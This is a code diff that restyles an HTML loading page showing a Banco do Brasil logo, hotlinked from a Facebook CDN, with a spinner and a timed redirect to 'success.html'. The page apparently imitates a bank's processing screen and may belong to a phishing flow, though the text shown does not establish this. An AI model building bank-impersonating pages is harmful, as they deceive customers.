@@ -18,37 +18,45 @@
             align-items: center;
             flex-direction: column;
         }
+        .spinner-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+        }
         .spinner {
             border: 8px solid rgba(255, 255, 255, 0.3);
             border-top: 8px solid #0d00ff;
             border-radius: 50%;
-            width: 100px;
-            height: 100px;
-            animation: spin 5s linear forwards;
+            width: 100%;
+            height: 100%;
+            animation: spin 7s linear forwards;
         }
         @keyframes spin {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
         .logo {
-            margin-top: -20px;
-            border-radius: 50%;
             position: absolute;
-            top: 48%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+            top: 57%;
+            left: 57%;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            transform: translate(-57%, -57%);
         }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <img src="https://scontent.ffor7-1.fna.fbcdn.net/v/t39.30808-6/366571143_667707292058176_3007138064656193450_n.jpg?_nc_cat=1&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=o679WyFgQUgQ7kNvgFdTstA&_nc_zt=23&_nc_ht=scontent.ffor7-1.fna&_nc_gid=AYJyeKyJksXP1un_mLcvKLm&oh=00_AYAnzJU3oFkfMfvZ0t3-dJbZ4mksZjx48wCBVbzCPjYfsA&oe=67982429" alt="Banco do Brasil" class="logo" width="100">
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <img src="https://scontent.ffor7-1.fna.fbcdn.net/v/t39.30808-6/366571143_667707292058176_3007138064656193450_n.jpg?_nc_cat=1&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=o679WyFgQUgQ7kNvgFdTstA&_nc_zt=23&_nc_ht=scontent.ffor7-1.fna&_nc_gid=AYJyeKyJksXP1un_mLcvKLm&oh=00_AYAnzJU3oFkfMfvZ0t3-dJbZ4mksZjx48wCBVbzCPjYfsA&oe=67982429" alt="Banco do Brasil" class="logo">
+    </div>
     <h2>Aguarde, processando...</h2>
 
     <script>
         setTimeout(() => {
             window.location.href = 'success.html';
-        }, 6000);
+        }, 7000);
     </script>
 </body>
 </html>
